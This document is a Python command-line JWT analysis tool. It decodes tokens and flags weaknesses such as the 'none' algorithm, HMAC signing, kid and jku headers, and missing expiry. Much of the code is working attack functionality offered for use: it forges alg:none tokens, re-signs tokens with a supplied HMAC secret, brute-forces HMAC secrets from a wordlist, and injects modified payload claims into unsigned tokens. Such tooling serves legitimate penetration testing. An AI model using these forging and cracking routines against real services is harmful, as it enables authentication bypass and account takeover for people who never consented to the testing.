#!/usr/bin/env python3
"""jwt-analyzer - Decode, analyze, and test JWT tokens for vulnerabilities."""

import sys
import json
import base64
import argparse
import hmac
import hashlib
import time
from datetime import datetime, timezone


def b64_decode(data):
    """Decode base64url data with padding fix."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def b64_encode(data):
    """Encode to base64url without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def decode_jwt(token):
    """Decode JWT into header, payload, signature."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return None, None, None, "Invalid JWT: expected 3 parts, got {}".format(len(parts))

    try:
        header = json.loads(b64_decode(parts[0]))
    except Exception as e:
        return None, None, None, f"Failed to decode header: {e}"

    try:
        payload = json.loads(b64_decode(parts[1]))
    except Exception as e:
        return None, None, None, f"Failed to decode payload: {e}"

    signature = parts[2]
    return header, payload, signature, None


def check_vulnerabilities(header, payload, token):
    """Check JWT for common vulnerabilities."""
    vulns = []

    # Check for 'none' algorithm
    alg = header.get('alg', '').lower()
    if alg == 'none' or alg == '':
        vulns.append({
            'severity': 'CRITICAL',
            'title': 'Algorithm None Attack',
            'description': 'JWT uses "none" algorithm - signature verification can be bypassed',
            'cve': 'CVE-2015-9235'
        })

    # Check for weak algorithms
    if alg in ('hs256', 'hs384', 'hs512'):
        vulns.append({
            'severity': 'MEDIUM',
            'title': 'HMAC Algorithm Used',
            'description': f'JWT uses {header.get("alg")} - vulnerable to brute-force if secret is weak. '
                           'Also check for RS/HS algorithm confusion (CVE-2016-5431).',
            'cve': 'CVE-2016-5431'
        })

    # Check for missing kid validation
    if 'kid' in header:
        vulns.append({
            'severity': 'MEDIUM',
            'title': 'Key ID (kid) Present',
            'description': f'kid="{header["kid"]}" - Test for SQL injection, path traversal, '
                           'or command injection in kid parameter.',
            'cve': 'N/A'
        })

    # Check for jku/x5u header injection
    for param in ('jku', 'x5u', 'x5c'):
        if param in header:
            vulns.append({
                'severity': 'HIGH',
                'title': f'{param.upper()} Header Found',
                'description': f'{param}="{header[param]}" - Server may fetch keys from attacker-controlled URL.',
                'cve': 'CVE-2018-0114'
            })

    # Check expiration
    now = time.time()
    if 'exp' in payload:
        exp = payload['exp']
        if exp < now:
            vulns.append({
                'severity': 'LOW',
                'title': 'Token Expired',
                'description': f'Token expired at {datetime.fromtimestamp(exp, tz=timezone.utc).isoformat()}. '
                               'Test if server still accepts expired tokens.',
                'cve': 'N/A'
            })
    else:
        vulns.append({
            'severity': 'MEDIUM',
            'title': 'No Expiration Claim',
            'description': 'JWT has no "exp" claim - token never expires.',
            'cve': 'N/A'
        })

    # Check for sensitive data in payload
    sensitive_keys = ['password', 'secret', 'key', 'token', 'credit_card', 'ssn', 'api_key']
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            vulns.append({
                'severity': 'HIGH',
                'title': 'Sensitive Data in Payload',
                'description': f'Potentially sensitive field "{key}" found in JWT payload. '
                               'JWTs are base64-encoded, not encrypted.',
                'cve': 'N/A'
            })

    # Check for weak nbf
    if 'nbf' in payload and payload['nbf'] > now:
        vulns.append({
            'severity': 'INFO',
            'title': 'Token Not Yet Valid',
            'description': f'Token becomes valid at {datetime.fromtimestamp(payload["nbf"], tz=timezone.utc).isoformat()}',
            'cve': 'N/A'
        })

    return vulns


def forge_none_token(header, payload):
    """Create a forged token with algorithm 'none'."""
    header_copy = dict(header)
    header_copy['alg'] = 'none'
    h = b64_encode(json.dumps(header_copy, separators=(',', ':')))
    p = b64_encode(json.dumps(payload, separators=(',', ':')))
    return f"{h}.{p}."


def forge_hmac_token(header, payload, secret, alg='HS256'):
    """Create a token signed with HMAC."""
    header_copy = dict(header)
    header_copy['alg'] = alg
    h = b64_encode(json.dumps(header_copy, separators=(',', ':')))
    p = b64_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{h}.{p}".encode()

    hash_func = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    if alg not in hash_func:
        return None
    sig = hmac.new(secret.encode(), signing_input, hash_func[alg]).digest()
    return f"{h}.{p}.{b64_encode(sig)}"


def brute_force_secret(token, wordlist_path):
    """Attempt to brute-force HMAC secret from wordlist."""
    parts = token.strip().split('.')
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64_decode(parts[2])

    count = 0
    with open(wordlist_path) as f:
        for line in f:
            secret = line.strip()
            count += 1
            sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(sig, target_sig):
                return secret, count
            # Also try SHA384 and SHA512
            for hf in (hashlib.sha384, hashlib.sha512):
                sig = hmac.new(secret.encode(), signing_input, hf).digest()
                if hmac.compare_digest(sig, target_sig):
                    return secret, count

    return None, count


def main():
    parser = argparse.ArgumentParser(
        description='JWT Token Analyzer - Decode, analyze, and test JWT tokens',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Examples:\n'
               '  jwt-analyzer eyJhbGci...\n'
               '  jwt-analyzer -t eyJhbGci... --forge-none\n'
               '  jwt-analyzer -t eyJhbGci... --crack -w wordlist.txt\n'
               '  echo "token" | jwt-analyzer -'
    )
    parser.add_argument('token', nargs='?', help='JWT token to analyze')
    parser.add_argument('-t', '--token-input', help='JWT token (alternative flag)')
    parser.add_argument('--forge-none', action='store_true', help='Generate alg:none forged token')
    parser.add_argument('--forge-hmac', metavar='SECRET', help='Forge token with HMAC secret')
    parser.add_argument('--crack', action='store_true', help='Brute-force HMAC secret')
    parser.add_argument('-w', '--wordlist', help='Wordlist for brute-force')
    parser.add_argument('--modify-payload', metavar='JSON', help='Modify payload fields (JSON)')
    parser.add_argument('-j', '--json', action='store_true', help='JSON output')
    args = parser.parse_args()

    token = args.token_input or args.token
    if token == '-' or (not token and not sys.stdin.isatty()):
        token = sys.stdin.readline().strip()
    if not token:
        parser.print_help()
        sys.exit(1)

    header, payload, signature, error = decode_jwt(token)
    if error:
        print(f"[!] Error: {error}", file=sys.stderr)
        sys.exit(1)

    vulns = check_vulnerabilities(header, payload, token)

    if args.json:
        result = {
            'header': header,
            'payload': payload,
            'signature': signature,
            'vulnerabilities': vulns,
        }
        if args.forge_none:
            result['forged_none_token'] = forge_none_token(header, payload)
        if args.forge_hmac:
            result['forged_hmac_token'] = forge_hmac_token(header, payload, args.forge_hmac)
        print(json.dumps(result, indent=2, default=str))
    else:
        print("\n" + "=" * 60)
        print("  JWT ANALYZER RESULTS")
        print("=" * 60)

        print("\n[HEADER]")
        for k, v in header.items():
            print(f"  {k}: {v}")

        print("\n[PAYLOAD]")
        for k, v in payload.items():
            display = v
            if k in ('exp', 'iat', 'nbf') and isinstance(v, (int, float)):
                display = f"{v} ({datetime.fromtimestamp(v, tz=timezone.utc).isoformat()})"
            print(f"  {k}: {display}")

        print(f"\n[SIGNATURE]\n  {signature[:40]}...")

        if vulns:
            print(f"\n[VULNERABILITIES] ({len(vulns)} found)")
            for v in vulns:
                icon = {'CRITICAL': '!!!', 'HIGH': '!!', 'MEDIUM': '!', 'LOW': '-', 'INFO': 'i'}
                print(f"  [{icon.get(v['severity'], '?')}] [{v['severity']}] {v['title']}")
                print(f"      {v['description']}")
                if v['cve'] != 'N/A':
                    print(f"      CVE: {v['cve']}")
        else:
            print("\n[VULNERABILITIES] None detected")

        if args.forge_none:
            print(f"\n[FORGED TOKEN (alg:none)]")
            print(f"  {forge_none_token(header, payload)}")

        if args.forge_hmac:
            forged = forge_hmac_token(header, payload, args.forge_hmac)
            print(f"\n[FORGED TOKEN (HMAC)]")
            print(f"  {forged}")

        if args.crack and args.wordlist:
            print(f"\n[BRUTE-FORCE] Trying wordlist: {args.wordlist}")
            secret, attempts = brute_force_secret(token, args.wordlist)
            if secret:
                print(f"  [+] SECRET FOUND: {secret} (after {attempts} attempts)")
            else:
                print(f"  [-] Secret not found after {attempts} attempts")

    if args.modify_payload:
        mods = json.loads(args.modify_payload)
        new_payload = dict(payload)
        new_payload.update(mods)
        print(f"\n[MODIFIED PAYLOAD TOKEN (unsigned)]")
        print(f"  {forge_none_token(header, new_payload)}")


if __name__ == '__main__':
    main()
